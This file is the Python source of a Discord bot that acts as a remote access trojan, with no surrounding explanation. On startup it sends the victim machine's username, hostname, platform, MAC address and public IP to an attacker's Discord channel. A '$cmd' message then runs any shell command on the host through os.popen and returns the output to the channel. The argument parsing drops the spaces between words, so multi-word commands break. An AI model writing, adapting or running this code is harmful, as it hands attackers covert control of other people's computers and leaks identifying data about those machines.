import discord
import settings

import os
import platform
from uuid import getnode
from requests import get

intents = discord.Intents.default()
intents.message_content = True

client = discord.Client(intents=intents)

@client.event
async def on_ready():
    print(f'We have logged in as {client.user}')
    ip = get('https://api.ipify.org').content.decode('utf8')
    channel = client.get_channel(settings.channel)
    await channel.send('**Connected!**\n```' +
                       os.getlogin() + ' | ' + platform.node() + '\n' +
                       'platform: ' + platform.platform() + '\n' +
                       'MAC: ' + str(getnode()) + '\n' +
                       'IP: ' + ip + '\n' +
                       '```'
    )

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('$list'):
        ip = get('https://api.ipify.org').content.decode('utf8')
        await message.channel.send(os.getlogin() + ' | ' + platform.node() + '\n```' + 
                           'platform: ' + platform.platform() + '\n' +
                           'MAC: ' + str(getnode()) + '\n' +
                           'IP: ' + ip + '\n' +
                           '```'
        )

    if message.content.startswith('$cmd'):
        msg = message.content.split()
        cmd = ''.join((msg[1:]))
        out = os.popen(cmd).read()
        if len(out) > 2000:
            with open('message.txt', 'w') as f:
                f.write(out)
            await message.channel.send(file=discord.File('message.txt'))
        else:
            await message.channel.send(out)

client.run(settings.token)
